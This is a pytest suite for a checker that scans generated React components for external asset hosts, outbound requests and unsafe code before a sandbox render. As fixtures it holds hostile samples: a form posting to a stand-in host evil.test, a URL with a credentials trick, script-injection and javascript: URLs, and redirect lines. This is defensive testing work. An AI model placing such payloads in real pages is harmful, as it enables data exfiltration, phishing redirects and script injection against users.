"""What a project may not do, read before it costs a render.

Every case here is a line of code that compiled, rendered and looked fine — and
that would have shipped a block pointing at somebody else's server. That is why the
bar is text: it is the only place where "where does this come from" is still a fact
rather than a look.
"""

import pytest

from app.harness import checks, sandbox
from app.harness.schemas import ASSETS, SAFETY, SandboxCheck, SandboxFile, SandboxResult
from app.settings import settings

pytestmark = pytest.mark.anyio

BLOCK = "src/Block.tsx"
CLOUD = settings.cloudinary_cloud_name or "genblocks"
OURS = f"https://res.cloudinary.com/{CLOUD}/image/upload/v1/images/abc123"


def project(content: str, *, path: str = BLOCK) -> list[SandboxFile]:
    return [SandboxFile(path=path, content=content)]


def said(check: SandboxCheck) -> str:
    return check.detail or ""


def test_a_block_that_brings_its_own_pictures_passes():
    found = checks.inspect(
        project(
            f"""
            export default function Block() {{
              return (
                <section>
                  <img src="/dunes.png" alt="" />
                  <img src="{OURS}" alt="" />
                  <img src="data:image/png;base64,AAAA" alt="" />
                  <img srcSet="/a.png 1x, {OURS} 2x" alt="" />
                  <a href="#next">Next</a>
                </section>
              );
            }}
            """
        )
    )

    assert [one.ok for one in found] == [True, True]


def test_a_picture_from_somewhere_else_is_refused():
    found = checks.inspect(
        project(
            """
            export default function Block() {
              return <img src="https://images.unsplash.com/photo-1" alt="" />;
            }
            """
        )
    )

    assets = found[0]
    assert assets.name == ASSETS
    assert assets.ok is False
    # A reader needs to know where, not just that.
    assert f"{BLOCK}:3" in said(assets)
    assert "images.unsplash.com" in said(assets)


def test_an_anchor_to_another_page_is_refused():
    found = checks.inspect(project('<a href="https://evil.test/reset">Reset</a>'))

    assert found[0].ok is False
    assert "evil.test" in said(found[0])


def test_an_anchor_that_stays_in_the_block_is_allowed():
    found = checks.inspect(project('<a href="#next">Next</a>'))

    assert found[0].ok is True


def test_an_anchor_that_embeds_a_page_is_refused():
    found = checks.inspect(project('<a href="data:text/html,<script>alert(1)</script>">Go</a>'))

    assert found[1].ok is False
    assert "data:" in said(found[1])


def test_a_form_that_posts_somewhere_is_refused():
    found = checks.inspect(project('<form action="https://evil.test/collect" />'))

    assert found[1].ok is False
    assert "posts a form to an address" in said(found[1])


@pytest.mark.parametrize(
    ("line", "what"),
    [
        ("<script>alert(1)</script>", "script"),
        ('<iframe srcdoc="<p>x</p>" />', "iframe"),
        ('<object data="/x" />', "object"),
        ('<meta httpEquiv="refresh" content="0;url=https://evil.test" />', "refresh"),
        ('.band { background-image: image-set("https://evil.test/x.png" 1x); }', "image-set"),
    ],
)
def test_ways_of_leaving_the_block_are_refused(line, what):
    found = checks.inspect(project(line))

    assert any(not one.ok for one in found)
    assert what in " ".join(said(one) for one in found)


@pytest.mark.parametrize(
    "line",
    [
        "window.location.href = 'https://evil.test';",
        "location.assign('https://evil.test');",
        "const one = new Image(); one.src = 'https://evil.test/x';",
        "await import('https://evil.test/x.js');",
        "const one = navigator.sendBeacon;",
    ],
)
def test_browser_globals_that_can_leave_the_block_are_refused(line):
    found = checks.inspect(project(line))

    assert found[1].ok is False


def test_a_stylesheet_from_another_host_is_refused():
    found = checks.inspect(
        project('<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter" />')
    )

    assert found[0].ok is False
    assert "fonts.googleapis.com" in said(found[0])


def test_a_font_imported_from_another_host_is_refused():
    found = checks.inspect(
        project('@import url("https://fonts.googleapis.com/css2?family=Inter");')
    )

    assert found[0].ok is False
    assert "fonts.googleapis.com" in said(found[0])


def test_a_css_background_from_another_host_is_refused():
    found = checks.inspect(project(".band { background-image: url(https://cdn.test/x.png); }"))

    assert found[0].ok is False
    assert "cdn.test" in said(found[0])


def test_srcset_is_read_candidate_by_candidate():
    found = checks.inspect(project('<img srcSet="/a.png 1x, https://cdn.test/b.png 2x" alt="" />'))

    assert found[0].ok is False
    assert "cdn.test/b.png" in said(found[0])
    # The local candidate is not reported: it is the one that travels.
    assert "/a.png" not in said(found[0]).replace("cdn.test/b.png", "")


def test_findings_are_reported_in_the_order_they_are_written():
    found = checks.inspect(
        project(
            '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter" />\n'
            '<img src="https://images.unsplash.com/photo-1" alt="" />\n'
        )
    )

    detail = said(found[0])
    assert detail.index("fonts.googleapis.com") < detail.index("images.unsplash.com")


def test_a_path_with_a_colon_is_still_a_path():
    found = checks.inspect(project('<img src="/images/2026:10/dunes.png" alt="" />'))

    assert found[0].ok is True


def test_a_port_does_not_make_our_host_somebody_elses():
    found = checks.inspect(
        project(f'<img src="https://res.cloudinary.com:443/{CLOUD}/x.png" alt="" />')
    )

    assert found[0].ok is True


def test_another_cloudinary_account_is_somebody_elses(monkeypatch):
    monkeypatch.setattr(settings, "cloudinary_cloud_name", "ours")

    found = checks.inspect(
        project('<img src="https://res.cloudinary.com/theirs/image/upload/x.png" alt="" />')
    )

    assert found[0].ok is False
    assert "theirs" in said(found[0])


def test_credentials_do_not_hide_where_the_request_goes():
    found = checks.inspect(
        project('<img src="https://res.cloudinary.com@evil.test/x.png" alt="" />')
    )

    assert found[0].ok is False


def test_a_protocol_relative_url_is_external():
    found = checks.inspect(project('<img src="//cdn.test/x.png" alt="" />'))

    assert found[0].ok is False


def test_reaching_the_network_is_refused():
    found = checks.inspect(
        project(
            """
            export default function Block() {
              fetch("/api");
              return <section />;
            }
            """
        )
    )

    safety = found[1]
    assert safety.name == SAFETY
    assert safety.ok is False
    assert "calls fetch(" in said(safety)


@pytest.mark.parametrize(
    ("line", "what"),
    [
        ("eval(userInput);", "eval("),
        ("const one = new Function(userInput);", "builds a function from a string"),
        ("document.write(userInput);", "writes markup with document.write"),
        ("<div dangerouslySetInnerHTML={{ __html: userInput }} />", "dangerouslySetInnerHTML"),
        ('<a href="javascript:alert(1)">Go</a>', "javascript:"),
    ],
)
def test_leaving_react_by_executing_a_string_is_refused(line, what):
    found = checks.inspect(project(line))

    assert found[1].ok is False
    assert what in said(found[1])


def test_prose_in_a_comment_is_not_a_call():
    found = checks.inspect(
        project(
            """
            export default function Block() {
              // We used to fetch("/api") here, and now the copy is static.
              /* eval( is not called anywhere either. */
              return <section />;
            }
            """
        )
    )

    assert found[1].ok is True


def test_only_the_first_findings_are_printed_and_the_rest_are_counted():
    lines = "\n".join(f'<img src="https://cdn.test/{index}.png" alt="" />' for index in range(7))

    found = checks.inspect(project(lines))

    assert "and 2 more" in said(found[0])


def test_the_hosts_the_block_may_load_from_are_configuration(monkeypatch):
    monkeypatch.setattr(settings, "allowed_asset_hosts", "cdn.test, res.cloudinary.com")

    assert checks.inspect(project('<img src="https://cdn.test/x.png" alt="" />'))[0].ok is True
    assert (
        checks.inspect(project('<img src="https://cloudinary.com/x.png" alt="" />'))[0].ok is False
    )


async def test_the_sandbox_is_not_asked_when_the_text_refuses(monkeypatch):
    async def never(files):
        raise AssertionError("a project that loads from elsewhere must not reach the sandbox")

    monkeypatch.setattr(sandbox, "check", never)

    found = await checks.check(project('<img src="https://cdn.test/x.png" alt="" />'))

    assert found.blocked is True
    assert [one.name for one in found.checks] == [ASSETS, SAFETY]
    assert found.screenshot is None


async def test_the_sandbox_answers_after_the_text_passes(monkeypatch):
    async def asked(files):
        return SandboxResult(checks=[SandboxCheck(name="typecheck", ok=True)])

    monkeypatch.setattr(sandbox, "check", asked)

    found = await checks.check(project("<section />"))

    # One list for every reader: the text's findings and the sandbox's, in the
    # order they were made.
    assert [one.name for one in found.checks] == [ASSETS, SAFETY, "typecheck"]
    assert found.blocked is False
